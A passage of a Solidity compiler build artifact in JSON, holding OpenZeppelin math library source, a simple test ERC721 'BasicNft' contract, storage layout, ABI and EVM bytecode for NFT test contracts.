result.\\n        unchecked {\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            return min(result, a / result);\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates sqrt(a), following the selected rounding direction.\\n     */\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = sqrt(a);\\n            return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 128;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 64;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 32;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 16;\\n            }\\n            if (value >> 8 > 0) {\\n                value >>= 8;\\n                result += 8;\\n            }\\n            if (value >> 4 > 0) {\\n                value >>= 4;\\n                result += 4;\\n            }\\n            if (value >> 2 > 0) {\\n                value >>= 2;\\n                result += 2;\\n            }\\n            if (value >> 1 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log2(value);\\n            return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >= 10**64) {\\n                value /= 10**64;\\n                result += 64;\\n            }\\n            if (value >= 10**32) {\\n                value /= 10**32;\\n                result += 32;\\n            }\\n            if (value >= 10**16) {\\n                value /= 10**16;\\n                result += 16;\\n            }\\n            if (value >= 10**8) {\\n                value /= 10**8;\\n                result += 8;\\n            }\\n            if (value >= 10**4) {\\n                value /= 10**4;\\n                result += 4;\\n            }\\n            if (value >= 10**2) {\\n                value /= 10**2;\\n                result += 2;\\n            }\\n            if (value >= 10**1) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log10(value);\\n            return result + (rounding == Rounding.Up && 10**result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     *\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\n     */\\n    function log256(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 16;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 8;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 4;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 2;\\n            }\\n            if (value >> 8 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log256(value);\\n            return result + (rounding == Rounding.Up && 1 << (result * 8) < value ? 1 : 0);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xa1e8e83cd0087785df04ac79fb395d9f3684caeaf973d9e2c71caef723a3a5d6\",\"license\":\"MIT\"},\"contracts/test/BasicNft.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.7;\\n\\nimport \\\"@openzeppelin/contracts/token/ERC721/ERC721.sol\\\";\\n\\ncontract BasicNft is ERC721 {\\n    string public constant TOKEN_URI =\\n        \\\"ipfs://bafybeig37ioir76s7mg5oobetncojcm3c3hxasyd4rvid4jqhy4gkaheg4/?filename=0-PUG.json\\\";\\n    uint256 private s_tokenCounter;\\n    event DogMinted(uint256 indexed tokenId);\\n\\n    constructor() ERC721(\\\"Dogie\\\", \\\"DOG\\\") {\\n        s_tokenCounter = 0;\\n    }\\n\\n    function mintNft() public {\\n        _safeMint(msg.sender, s_tokenCounter);\\n        emit DogMinted(s_tokenCounter);\\n        s_tokenCounter = s_tokenCounter + 1;\\n    }\\n\\n    function tokenURI(\\n        uint256 tokenId\\n    ) public view override returns (string memory) {\\n        require(\\n            _exists(tokenId),\\n            \\\"ERC721 Metadata: URI query for nonexistent token\\\"\\n        );\\n        return TOKEN_URI;\\n    }\\n\\n    function getTokenCounter() public view returns (uint256) {\\n        return s_tokenCounter;\\n    }\\n}\\n\",\"keccak256\":\"0xb103525f4d93e13b90062617ff44d0f2ed4d21a4069e6330eff1529955a55cc2\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":79,"contract":"contracts/test/BasicNft.sol:BasicNft","label":"_name","offset":0,"slot":"0","type":"t_string_storage"},{"astId":81,"contract":"contracts/test/BasicNft.sol:BasicNft","label":"_symbol","offset":0,"slot":"1","type":"t_string_storage"},{"astId":85,"contract":"contracts/test/BasicNft.sol:BasicNft","label":"_owners","offset":0,"slot":"2","type":"t_mapping(t_uint256,t_address)"},{"astId":89,"contract":"contracts/test/BasicNft.sol:BasicNft","label":"_balances","offset":0,"slot":"3","type":"t_mapping(t_address,t_uint256)"},{"astId":93,"contract":"contracts/test/BasicNft.sol:BasicNft","label":"_tokenApprovals","offset":0,"slot":"4","type":"t_mapping(t_uint256,t_address)"},{"astId":99,"contract":"contracts/test/BasicNft.sol:BasicNft","label":"_operatorApprovals","offset":0,"slot":"5","type":"t_mapping(t_address,t_mapping(t_address,t_bool))"},{"astId":3205,"contract":"contracts/test/BasicNft.sol:BasicNft","label":"s_tokenCounter","offset":0,"slot":"6","type":"t_uint256"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"},"t_bool":{"encoding":"inplace","label":"bool","numberOfBytes":"1"},"t_mapping(t_address,t_bool)":{"encoding":"mapping","key":"t_address","label":"mapping(address => bool)","numberOfBytes":"32","value":"t_bool"},"t_mapping(t_address,t_mapping(t_address,t_bool))":{"encoding":"mapping","key":"t_address","label":"mapping(address => mapping(address => bool))","numberOfBytes":"32","value":"t_mapping(t_address,t_bool)"},"t_mapping(t_address,t_uint256)":{"encoding":"mapping","key":"t_address","label":"mapping(address => uint256)","numberOfBytes":"32","value":"t_uint256"},"t_mapping(t_uint256,t_address)":{"encoding":"mapping","key":"t_uint256","label":"mapping(uint256 => address)","numberOfBytes":"32","value":"t_address"},"t_string_storage":{"encoding":"bytes","label":"string","numberOfBytes":"32"},"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"userdoc":{"kind":"user","methods":{},"version":1}}},"contracts/test/BasicNftTwo.sol":{"BasicNftTwo":{"abi":[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"DogMinted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"TOKEN_URI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getTokenCounter","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"mintNft","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"kind":"dev","methods":{"approve(address,uint256)":{"details":"See {IERC721-approve}."},"balanceOf(address)":{"details":"See {IERC721-balanceOf}."},"getApproved(uint256)":{"details":"See {IERC721-getApproved}."},"isApprovedForAll(address,address)":{"details":"See {IERC721-isApprovedForAll}."},"name()":{"details":"See {IERC721Metadata-name}."},"ownerOf(uint256)":{"details":"See {IERC721-ownerOf}."},"safeTransferFrom(address,address,uint256)":{"details":"See {IERC721-safeTransferFrom}."},"safeTransferFrom(address,address,uint256,bytes)":{"details":"See {IERC721-safeTransferFrom}."},"setApprovalForAll(address,bool)":{"details":"See {IERC721-setApprovalForAll}."},"supportsInterface(bytes4)":{"details":"See {IERC165-supportsInterface}."},"symbol()":{"details":"See {IERC721Metadata-symbol}."},"tokenURI(uint256)":{"details":"See {IERC721Metadata-tokenURI}."},"transferFrom(address,address,uint256)":{"details":"See {IERC721-transferFrom}."}},"version":1},"evm":{"bytecode":{"functionDebugData":{"@_116":{"entryPoint":null,"id":116,"parameterSlots":2,"returnSlots":0},"@_3294":{"entryPoint":null,"id":3294,"parameterSlots":0,"returnSlots":0},"extract_byte_array_length":{"entryPoint":368,"id":null,"parameterSlots":1,"returnSlots":1},"panic_error_0x22":{"entryPoint":422,"id":null,"parameterSlots":0,"returnSlots":0}},"generatedSources":[{"ast":{"nodeType":"YulBlock","src":"0:516:15","statements":[{"body":{"nodeType":"YulBlock","src":"58:269:15","statements":[{"nodeType":"YulAssignment","src":"68:22:15","value":{"arguments":[{"name":"data","nodeType":"YulIdentifier","src":"82:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"88:1:15","type":"","value":"2"}],"functionName":{"name":"div","nodeType":"YulIdentifier","src":"78:3:15"},"nodeType":"YulFunctionCall","src":"78:12:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"68:6:15"}]},{"nodeType":"YulVariableDeclaration","src":"99:38:15","value":{"arguments":[{"name":"data","nodeType":"YulIdentifier","src":"129:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"135:1:15","type":"","value":"1"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"125:3:15"},"nodeType":"YulFunctionCall","src":"125:12:15"},"variables":[{"name":"outOfPlaceEncoding","nodeType":"YulTypedName","src":"103:18:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"176:51:15","statements":[{"nodeType":"YulAssignment","src":"190:27:15","value":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"204:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"212:4:15","type":"","value":"0x7f"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"200:3:15"},"nodeType":"YulFunctionCall","src":"200:17:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"190:6:15"}]}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nodeType":"YulIdentifier","src":"156:18:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"149:6:15"},"nodeType":"YulFunctionCall","src":"149:26:15"},"nodeType":"YulIf","src":"146:81:15"},{"body":{"nodeType":"YulBlock","src":"279:42:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x22","nodeType":"YulIdentifier","src":"293:16:15"},"nodeType":"YulFunctionCall","src":"293:18:15"},"nodeType":"YulExpressionStatement","src":"293:18:15"}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nodeType":"YulIdentifier","src":"243:18:15"},{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"266:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"274:2:15","type":"","value":"32"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"263:2:15"},"nodeType":"YulFunctionCall","src":"263:14:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"240:2:15"},"nodeType":"YulFunctionCall","src":"240:38:15"},"nodeType":"YulIf","src":"237:84:15"}]},"name":"extract_byte_array_length","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nodeType":"YulTypedName","src":"42:4:15","type":""}],"returnVariables":[{"name":"length","nodeType":"YulTypedName","src":"51:6:15","type":""}],"src":"7:320:15"},{"body":{"nodeType":"YulBlock","src":"361:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"378:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"381:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"371:6:15"},"nodeType":"YulFunctionCall","src":"371:88:15"},"nodeType":"YulExpressionStatement","src":"371:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"475:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"478:4:15","type":"","value":"0x22"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"468:6:15"},"nodeType":"YulFunctionCall","src":"468:15:15"},"nodeType":"YulExpressionStatement","src":"468:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"499:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"502:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"492:6:15"},"nodeType":"YulFunctionCall","src":"492:15:15"},"nodeType":"YulExpressionStatement","src":"492:15:15"}]},"name":"panic_error_0x22","nodeType":"YulFunctionDefinition","src":"333:180:15"}]},"contents":"{\n\n    function extract_byte_array_length(data) -> length {\n        length := div(data, 2)\n        let outOfPlaceEncoding := and(data, 1)\n        if iszero(outOfPlaceEncoding) {\n            length := and(length, 0x7f)\n        }\n\n        if eq(outOfPlaceEncoding, lt(length, 32)) {\n            panic_error_0x22()\n        }\n    }\n\n    function panic_error_0x22() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x22)\n        revert(0, 0x24)\n    }\n\n}\n","id":15,"language":"Yul","name":"#utility.yul"}],"linkReferences":{},"object":"60806040523480156200001157600080fd5b506040518060400160405280600581526020017f446f6769650000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f444f470000000000000000000000000000000000000000000000000000000000815250816000908051906020019062000096929190620000c0565b508060019080519060200190620000af929190620000c0565b5050506000600681905550620001d5565b828054620000ce9062000170565b90600052602060002090601f016020900481019282620000f257600085556200013e565b82601f106200010d57805160ff19168380011785556200013e565b828001600101855582156200013e579182015b828111156200013d57825182559160200191906001019062000120565b5b5090506200014d919062000151565b5090565b5b808211156200016c57600081600090555060010162000152565b5090565b600060028204905060018216806200018957607f821691505b60208210811415620001a0576200019f620001a6565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b61255d80620001e56000396000f3fe608060405234801561001057600080fd5b50600436106101005760003560e01c806370a0823111610097578063b88d4fde11610066578063b88d4fde146102ad578063c2229fea146102c9578063c87b56dd146102d3578063e985e9c51461030357610100565b806370a082311461022557806378ce90351461025557806395d89b4114610273578063a22cb4651461029157610100565b806323b872dd116100d357806323b872dd1461019f57806342842e0e146101bb5780636352211e146101d75780636e02007d1461020757610100565b806301ffc9a71461010557806306fdde0314610135578063081812fc14610153578063095ea7b314610183575b600080fd5b61011f600480360381019061011a919061198e565b610333565b60405161012c9190611cbf565b60405180910390f35b61013d610415565b60405161014a9190611cda565b60405180910390f35b61016d600480360381019061016891906119e8565b6104a7565b60405161017a9190611c58565b60405180910390f35b61019d6004803603810190610198919061194e565b6104ed565b005b6101b960048036038101906101b49190611838565b610605565b005b6101d560048036038101906101d09190611838565b610665565b005b6101f160048036038101906101ec91906119e8565b610685565b6040516101fe9190611c58565b60405180910390f35b61020f61070c565b60405161021c9190611e7c565b60405180910390f35b61023f600480360381019061023a91906117cb565b610716565b60405161024c9190611e7c565b60405180910390f35b61025d6107ce565b60405161026a9190611cda565b60405180910390f35b61027b6107ea565b6040516102889190611cda565b60405180910390f35b6102ab60048036038101906102a6919061190e565b61087c565b005b6102c760048036038101906102c2919061188b565b610892565b005b6102d16108f4565b005b6102ed60048036038101906102e891906119e8565b610946565b6040516102fa9190611cda565b60405180910390f35b61031d600480360381019061031891906117f8565b610995565b60405161032a9190611cbf565b60405180910390f35b60007f80ac58cd000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614806103fe57507f5b5e139f000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b8061040e575061040d82610a29565b5b9050919050565b60606000805461042490612065565b80601f016020809104026020016040519081016040528092919081815260200182805461045090612065565b801561049d5780601f106104725761010080835404028352916020019161049d565b820191906000526020600020905b81548152906001019060200180831161048057829003601f168201915b5050505050905090565b60006104b282610a93565b6004600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b60006104f882610685565b90508073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610569576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161056090611e3c565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff16610588610ade565b73ffffffffffffffffffffffffffffffffffffffff1614806105b757506105b6816105b1610ade565b610995565b5b6105f6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105ed90611e5c565b60405180910390fd5b6106008383610ae6565b505050565b610616610610610ade565b82610b9f565b610655576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161064c90611cfc565b60405180910390fd5b610660838383610c34565b505050565b61068083838360405180602001604052806000815250610892565b505050565b60008061069183610f2e565b9050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415610703576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106fa90611dfc565b60405180910390fd5b80915050919050565b6000600654905090565b60008073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610787576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161077e90611dbc565b60405180910390fd5b600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6040518060600160405280603581526020016124f36035913981565b6060600180546107f990612065565b80601f016020809104026020016040519081016040528092919081815260200182805461082590612065565b80156108725780601f1061084757610100808354040283529160200191610872565b820191906000526020600020905b81548152906001019060200180831161085557829003601f168201915b5050505050905090565b61088e610887610ade565b8383610f6b565b5050565b6108a361089d610ade565b83610b9f565b6108e2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016108d990611cfc565b60405180910390fd5b6108ee848484846110d8565b50505050565b61090033600654611134565b6006547fef1da42f89c42f48befa143007e6f5efd84a2d1cc3dc97c5edd2d3373220f66d60405160405180910390a2600160065461093e9190611f25565b600681905550565b606061095182611152565b610990576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161098790611e1c565b60405180910390fd5b919050565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16905092915050565b60007f01ffc9a7000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916149050919050565b610a9c81611152565b610adb576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ad290611dfc565b60405180910390fd5b50565b600033905090565b816004600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16610b5983610685565b73ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92560405160405180910390a45050565b600080610bab83610685565b90508073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff161480610bed5750610bec8185610995565b5b80610c2b57508373ffffffffffffffffffffffffffffffffffffffff16610c13846104a7565b73ffffffffffffffffffffffffffffffffffffffff16145b91505092915050565b8273ffffffffffffffffffffffffffffffffffffffff16610c5482610685565b73ffffffffffffffffffffffffffffffffffffffff1614610caa576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ca190611d3c565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610d1a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d1190611d7c565b60405180910390fd5b610d278383836001611193565b8273ffffffffffffffffffffffffffffffffffffffff16610d4782610685565b73ffffffffffffffffffffffffffffffffffffffff1614610d9d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d9490611d3c565b60405180910390fd5b6004600082815260200190815260200160002060006101000a81549073ffffffffffffffffffffffffffffffffffffffff02191690556001600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055506001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a4610f2983838360016112b9565b505050565b60006002600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610fda576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610fd190611d9c565b60405180910390fd5b80600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31836040516110cb9190611cbf565b60405180910390a3505050565b6110e3848484610c34565b6110ef848484846112bf565b61112e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161112590611d1c565b60405180910390fd5b50505050565b61114e828260405180602001604052806000815250611456565b5050565b60008073ffffffffffffffffffffffffffffffffffffffff1661117483610f2e565b73ffffffffffffffffffffffffffffffffffffffff1614159050919050565b60018111156112b357600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16146112275780600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461121f9190611f7b565b925050819055505b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16146112b25780600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546112aa9190611f25565b925050819055505b5b50505050565b50505050565b60006112e08473ffffffffffffffffffffffffffffffffffffffff166114b1565b15611449578373ffffffffffffffffffffffffffffffffffffffff1663150b7a02611309610ade565b8786866040518563ffffffff1660e01b815260040161132b9493929190611c73565b602060405180830381600087803b15801561134557600080fd5b505af192505050801561137657506040513d601f19601f8201168201806040525081019061137391906119bb565b60015b6113f9573d80600081146113a6576040519150601f19603f3d011682016040523d82523d6000602084013e6113ab565b606091505b506000815114156113f1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016113e890611d1c565b60405180910390fd5b805181602001fd5b63150b7a0260e01b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916817bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19161491505061144e565b600190505b949350505050565b61146083836114d4565b61146d60008484846112bf565b6114ac576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114a390611d1c565b60405180910390fd5b505050565b6000808273ffffffffffffffffffffffffffffffffffffffff163b119050919050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415611544576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161153b90611ddc565b60405180910390fd5b61154d81611152565b1561158d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161158490611d5c565b60405180910390fd5b61159b600083836001611193565b6115a481611152565b156115e4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016115db90611d5c565b60405180910390fd5b6001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a46116ee6000838360016112b9565b5050565b600061170561170084611ebc565b611e97565b9050828152602081018484840111156117215761172061215a565b5b61172c848285612023565b509392505050565b60008135905061174381612496565b92915050565b600081359050611758816124ad565b92915050565b60008135905061176d816124c4565b92915050565b600081519050611782816124c4565b92915050565b600082601f83011261179d5761179c612155565b5b81356117ad8482602086016116f2565b91505092915050565b6000813590506117c5816124db565b92915050565b6000602082840312156117e1576117e0612164565b5b60006117ef84828501611734565b91505092915050565b6000806040838503121561180f5761180e612164565b5b600061181d85828601611734565b925050602061182e85828601611734565b9150509250929050565b60008060006060848603121561185157611850612164565b5b600061185f86828701611734565b935050602061187086828701611734565b9250506040611881868287016117b6565b9150509250925092565b600080600080608085870312156118a5576118a4612164565b5b60006118b387828801611734565b94505060206118c487828801611734565b93505060406118d5878288016117b6565b925050606085013567ffffffffffffffff8111156118f6576118f561215f565b5b61190287828801611788565b91505092959194509250565b6000806040838503121561192557611924612164565b5b600061193385828601611734565b925050602061194485828601611749565b9150509250929050565b6000806040838503121561196557611964612164565b5b600061197385828601611734565b9250506020611984858286016117b6565b9150509250929050565b6000602082840312156119a4576119a3612164565b5b60006119b28482850161175e565b91505092915050565b6000602082840312156119d1576119d0612164565b5b60006119df84828501611773565b91505092915050565b6000602082840312156119fe576119fd612164565b5b6000611a0c848285016117b6565b91505092915050565b611a1e81611faf565b82525050565b611a2d81611fc156